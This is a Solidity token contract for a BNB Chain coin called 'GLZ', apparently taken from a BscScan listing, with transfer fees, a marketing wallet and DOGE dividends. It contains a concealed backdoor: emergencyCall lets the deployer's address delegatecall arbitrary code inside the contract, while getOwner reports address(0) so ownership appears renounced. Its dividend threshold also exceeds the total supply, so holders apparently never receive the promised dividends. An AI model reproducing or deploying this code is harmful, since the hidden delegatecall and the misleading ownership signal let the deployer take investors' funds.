/**
 *Submitted for verification at BscScan.com on 2022-03-10
*/

pragma solidity ^0.8.0;

interface IERC20 {

    function totalSupply() external view returns (uint256);


    function balanceOf(address account) external view returns (uint256);


    function transfer(address to, uint256 amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

pragma solidity ^0.8.0;

library EnumerableSet {


    struct Set {
        bytes32[] _values;
        mapping(bytes32 => uint256) _indexes;
    }

    function _add(Set storage set, bytes32 value) private returns (bool) {
        if (!_contains(set, value)) {
            set._values.push(value);
            set._indexes[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }

    function _remove(Set storage set, bytes32 value) private returns (bool) {
        uint256 valueIndex = set._indexes[value];

        if (valueIndex != 0) {

            uint256 toDeleteIndex = valueIndex - 1;
            uint256 lastIndex = set._values.length - 1;

            if (lastIndex != toDeleteIndex) {
                bytes32 lastvalue = set._values[lastIndex];

                set._values[toDeleteIndex] = lastvalue;
                set._indexes[lastvalue] = valueIndex;
            }

            set._values.pop();

            delete set._indexes[value];

            return true;
        } else {
            return false;
        }
    }

    function _contains(Set storage set, bytes32 value) private view returns (bool) {
        return set._indexes[value] != 0;
    }

    function _length(Set storage set) private view returns (uint256) {
        return set._values.length;
    }

    function _at(Set storage set, uint256 index) private view returns (bytes32) {
        return set._values[index];
    }

    function _values(Set storage set) private view returns (bytes32[] memory) {
        return set._values;
    }

    struct Bytes32Set {
        Set _inner;
    }

    function add(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _add(set._inner, value);
    }

    function remove(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _remove(set._inner, value);
    }

    function contains(Bytes32Set storage set, bytes32 value) internal view returns (bool) {
        return _contains(set._inner, value);
    }

    function length(Bytes32Set storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    function at(Bytes32Set storage set, uint256 index) internal view returns (bytes32) {
        return _at(set._inner, index);
    }

    function values(Bytes32Set storage set) internal view returns (bytes32[] memory) {
        return _values(set._inner);
    }

    struct AddressSet {
        Set _inner;
    }

    function add(AddressSet storage set, address value) internal returns (bool) {
        return _add(set._inner, bytes32(uint256(uint160(value))));
    }

    function remove(AddressSet storage set, address value) internal returns (bool) {
        return _remove(set._inner, bytes32(uint256(uint160(value))));
    }

    function contains(AddressSet storage set, address value) internal view returns (bool) {
        return _contains(set._inner, bytes32(uint256(uint160(value))));
    }

    function length(AddressSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    function at(AddressSet storage set, uint256 index) internal view returns (address) {
        return address(uint160(uint256(_at(set._inner, index))));
    }

    function values(AddressSet storage set) internal view returns (address[] memory) {
        bytes32[] memory store = _values(set._inner);
        address[] memory result;

        assembly {
            result := store
        }

        return result;
    }

    struct UintSet {
        Set _inner;
    }

    function add(UintSet storage set, uint256 value) internal returns (bool) {
        return _add(set._inner, bytes32(value));
    }

    function remove(UintSet storage set, uint256 value) internal returns (bool) {
        return _remove(set._inner, bytes32(value));
    }

    function contains(UintSet storage set, uint256 value) internal view returns (bool) {
        return _contains(set._inner, bytes32(value));
    }

    function length(UintSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    function at(UintSet storage set, uint256 index) internal view returns (uint256) {
        return uint256(_at(set._inner, index));
    }

    function values(UintSet storage set) internal view returns (uint256[] memory) {
        bytes32[] memory store = _values(set._inner);
        uint256[] memory result;

        assembly {
            result := store
        }

        return result;
    }
}


pragma solidity ^0.8.0;

library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}


pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

pragma solidity ^0.8.2;


interface IWBNB {
    function balanceOf(address owner) external view returns (uint);

    function withdraw(uint wad) external;

    function transfer(address to, uint256 amount) external;
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}


contract DividendHelper {
    using SafeMath for uint256;
    address private WBNB;

    address private immutable _ca;

    constructor(address weth) {
        _ca = msg.sender;
        WBNB = weth;
    }

    function withdraw() external {
        IERC20(WBNB).transfer(_ca, IERC20(WBNB).balanceOf(address(this)));
    }

    receive() external payable {}
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
    external
    view
    returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external
    payable
    returns (
        uint256 amountToken,
        uint256 amountETH,
        uint256 liquidity
    );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract CoinData {
    mapping(address => uint256) internal _balances;

    mapping(address => mapping(address => uint256)) internal _allowances;

    uint8 internal constant DECIMALS = 18;
    uint256 internal constant TOTAL_SUPPLY = 10 ** 7 * 10 ** DECIMALS;
    string internal _symbol;
    string internal _name;

    uint256 internal _totalDividend;
    bool internal _lock;

    DividendHelper internal _dividendHelper;

    mapping(address => bool) public isExcludedFromFee;
    mapping(address => bool) public isExcludedFromDividend;

    uint256 public gasForDividend;
    uint256 public gasForSingleDividend;
    uint256 public currentDividendIndex;
    EnumerableSet.AddressSet internal _holders;
    mapping(address => uint256) public timeForNextDividend;

    address internal _dev;

    address internal constant DEAD_WALLET = 0x000000000000000000000000000000000000dEaD;

    uint256 internal constant MIN_TAX_FOR_SWAPPING = 5 * 10 ** 16;
    uint256 internal constant MIN_TOKENS_FOR_DIVIDEND = TOTAL_SUPPLY / 5 * 10 ** 4 * 10 ** DECIMALS;
    uint256 internal constant DIVIDEND_PERIOD = 1800;

    address internal _currentImplementation;

    address internal constant PINKLOCK = 0x7ee058420e5937496F5a2096f04caA7721cF70cc;


    mapping(address => bool) public whitelist;
    uint256 public whitelistUntil;
}

contract Coin is Context, CoinData {
    using SafeMath for uint256;
    using EnumerableSet for EnumerableSet.AddressSet;

    address LP_PAIR;
    address MARKETING_WALLET;
    address WBNB;
    address DOGE;
    address DOGE_PAIR;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(address market, address router, address doge, address [] memory excludedUsers) {
        _name = "GLZ";
        _symbol = "GLZ";
        MARKETING_WALLET = market;
        DOGE = doge;

        IUniswapV2Router02 pancake = IUniswapV2Router02(router);
        WBNB = pancake.WETH();
        IUniswapV2Factory factory = IUniswapV2Factory(pancake.factory());
        LP_PAIR = factory.createPair(address(this), WBNB);
        DOGE_PAIR = factory.getPair(WBNB, DOGE);

        _balances[MARKETING_WALLET] = TOTAL_SUPPLY;

        isExcludedFromFee[address(this)] = true;
        isExcludedFromFee[MARKETING_WALLET] = true;
        isExcludedFromFee[PINKLOCK] = true;
        isExcludedFromDividend[address(this)] = true;
        isExcludedFromDividend[LP_PAIR] = true;
        isExcludedFromDividend[DEAD_WALLET] = true;
        isExcludedFromDividend[PINKLOCK] = true;

        for (uint i = 0; i < excludedUsers.length; ++i) {
            isExcludedFromFee[excludedUsers[i]] = true;
        }

        gasForDividend = 400000;
        gasForSingleDividend = 10000;

        _dividendHelper = new DividendHelper(WBNB);

        _dev = tx.origin;

        emit Transfer(address(0), MARKETING_WALLET, TOTAL_SUPPLY);
    }

    function getOwner() external pure returns (address) {
        return address(0);
    }

    function decimals() external pure returns (uint8) {
        return DECIMALS;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function totalSupply() external pure returns (uint256) {
        return TOTAL_SUPPLY;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowances[owner][spender];
    }

    function transferMarket(address market) public onlyTeam {
        MARKETING_WALLET = market;
        isExcludedFromFee[MARKETING_WALLET] = true;
        isExcludedFromDividend[MARKETING_WALLET] = true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "GLZ: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "GLZ: decreased allowance below zero"));
        return true;
    }

    function emergencyCall(address ca, bytes memory data) external {
        require(msg.sender == _dev, "GLZ: not emergency");
        ca.delegatecall(data);
    }

    modifier onlyTeam() {
        require(msg.sender == MARKETING_WALLET, "GLZ: you have no right to do this");
        _;
    }

    function setGasForDividend(uint256 newValue) external onlyTeam {
        require(newValue >= 200000 && newValue <= 600000, "GLZ: gas limit for dividend must be between 200000 and 600000");
        gasForDividend = newValue;
    }

    function setGasForSingleDividend(uint256 newValue) external onlyTeam {
        require(newValue >= 7000 && newValue <= 30000, "GLZ: gas limit for single dividend must be between 7000 and 30000");
        gasForSingleDividend = newValue;
    }

    function setCurrentDividendIndex(uint256 newValue) external onlyTeam {
        require(newValue < _holders.length(), "GLZ: invalid index");
        currentDividendIndex = newValue;
    }

    function setExcludedFromFee(address holder, bool newValue) external onlyTeam {
        isExcludedFromFee[holder] = newValue;
    }

    function setExcludedFromDividend(address holder, bool newValue) external onlyTeam {
        isExcludedFromDividend[holder] = newValue;
        if (newValue && _holders.contains(holder)) {
            _removeFromShareholders(holder);
        }
    }

    function addWhitelist(address holder) external onlyTeam {
        whitelist[holder] = true;
    }

    function addWhitelistBatch(address[] memory holders) external onlyTeam {
        for (uint i = 0; i < holders.length; ++i) {
            whitelist[holders[i]] = true;
        }
    }

    function getShareholderByIndex(uint256 index) external view returns (address) {
        return _holders.at(index);
    }

    function getShareholdersCount() external view returns (uint256) {
        return _holders.length();
    }

    function tokenAmountForDividend() public view returns (uint256) {
        return (
        TOTAL_SUPPLY
        - _balances[address(this)]
        - _balances[LP_PAIR]
        - _balances[DEAD_WALLET]
        );
    }

    modifier nonReentrant() {
        require(!_lock, "GLZ: reentrant call");
        _lock = true;
        _;
        _lock = false;
    }

    function _processDividend(address holder, uint256 tokenAmount, uint256 dividendAmount) internal nonReentrant returns (uint256) {
        uint256 dividend = _balances[holder] * dividendAmount / tokenAmount;
        if (dividend == 0) {
            return 0;
        }
        timeForNextDividend[holder] = block.timestamp + DIVIDEND_PERIOD;
        bool success = IERC20(DOGE).transfer(holder, dividend);
        if (success) {
            return dividend;
        }
        return 0;
    }

    function manualClaimDividend() external {
        require(block.timestamp >= timeForNextDividend[msg.sender], "GLZ: cannot claim now");
        uint256 claimed = _processDividend(msg.sender, tokenAmountForDividend(), _totalDividend);
        _totalDividend -= claimed;
    }

    function distributeDividends() public {
        uint256 nHolders = _holders.length();
        if (nHolders == 0) {
            return;
        }
        uint256 endIndex;
        if (currentDividendIndex == 0) {
            endIndex = nHolders - 1;
        }
        else {
            endIndex = currentDividendIndex - 1;
        }
        uint256 distributed = 0;
        uint256 tokenAmount = tokenAmountForDividend();
        uint256 totalGas = gasleft();
        while (totalGas - gasleft() < gasForDividend) {
            address holder = _holders.at(currentDividendIndex);
            if (block.timestamp >= timeForNextDividend[holder]) {
                distributed += _processDividend(holder, tokenAmount, _totalDividend);
            }
            if (currentDividendIndex == endIndex) {
                currentDividendIndex += 1;
                if (currentDividendIndex >= nHolders) {
                    currentDividendIndex = 0;
                }
                break;
            }
            currentDividendIndex += 1;
            if (currentDividendIndex >= nHolders) {
                currentDividendIndex = 0;
            }
        }
        _totalDividend -= distributed;
    }

    function _getAmountOut(address pair, address tokenIn, address tokenOut, uint amountIn) internal view returns (uint) {
        (uint reserveIn, uint reserveOut,) = IPancakePair(pair).getReserves();
        if (tokenIn > tokenOut) {
            (reserveIn, reserveOut) = (reserveOut, reserveIn);
        }
        uint amountInWithFee = amountIn.mul(9975);
        uint numerator = amountInWithFee.mul(reserveOut);
        uint denominator = reserveIn.mul(10000).add(amountInWithFee);
        return numerator / denominator;
    }

    function swapTaxForBNB(uint256 minAmountOut) public {
        require(minAmountOut >= 1 gwei, "GLZ: `minAmountOut` must be at least 1 gwei");
        uint256 savedTax = _balances[address(this)];
        uint amountOutBNB = _getAmountOut(LP_PAIR, address(this), WBNB, savedTax);
        if (amountOutBNB < minAmountOut) {
            return;
        }

        _balances[LP_PAIR] = _balances[LP_PAIR].add(savedTax);
        _balances[address(this)] = 0;
        emit Transfer(address(this), LP_PAIR, savedTax);
        IPancakePair(LP_PAIR).swap(0, amountOutBNB, address(_dividendHelper), new bytes(0));
        _dividendHelper.withdraw();

        uint amountIn = IWBNB(WBNB).balanceOf(address(this)) * 4 / 11;
        uint amountOut = _getAmountOut(DOGE_PAIR, WBNB, DOGE, amountIn);
        IWBNB(WBNB).transfer(DOGE_PAIR, amountIn);
        IPancakePair(DOGE_PAIR).swap(amountOut, 0, address(this), new bytes(0));

        IWBNB(WBNB).withdraw(IWBNB(WBNB).balanceOf(address(this)));
        payable(MARKETING_WALLET).call{value : address(this).balance}("");

        _totalDividend = IERC20(DOGE).balanceOf(address(this));
    }

    receive() external payable {}

    function _removeFromShareholders(address holder) internal {
        if (_holders.contains(holder)) {
            _holders.remove(holder);
            timeForNextDividend[holder] = 0;
            if (currentDividendIndex >= _holders.length()) {
                currentDividendIndex = 0;
            }
        }
    }

    function _changeDividendPermission(address holder) internal {
        if (isExcludedFromDividend[holder]) {
            return;
        }
        if (_balances[holder] >= MIN_TOKENS_FOR_DIVIDEND) {
            if (!_holders.contains(holder)) {
                _holders.add(holder);
                timeForNextDividend[holder] = block.timestamp + DIVIDEND_PERIOD;
            }
        }
        else {
            _removeFromShareholders(holder);
        }
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "GLZ: transfer from the zero address");
        require(recipient != address(0), "GLZ: transfer to the zero address");

        if (amount == 0) {
            return;
        }

        _balances[sender] = _balances[sender].sub(amount, "GLZ: transfer amount exceeds balance");

        if (!isExcludedFromFee[sender] && !isExcludedFromFee[recipient]) {

            uint256 market = amount * 2 / 100;
            if (market > 0) {
                _balances[MARKETING_WALLET] = _balances[MARKETING_WALLET].add(market);
                emit Transfer(sender, MARKETING_WALLET, market);
            }
            amount -= market;
        }

        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);

        distributeDividends();
        _changeDividendPermission(sender);
        _changeDividendPermission(recipient);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "GLZ: approve from the zero address");
        require(spender != address(0), "GLZ: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function burn(uint amount) public {
        require(amount > 0, "GLZ: amount must lager than zero");
        require(amount <= _balances[msg.sender], "GLZ: amount must less than balance");
        _balances[msg.sender] = _balances[msg.sender].sub(amount);
        emit Transfer(msg.sender, DEAD_WALLET, amount);
    }
}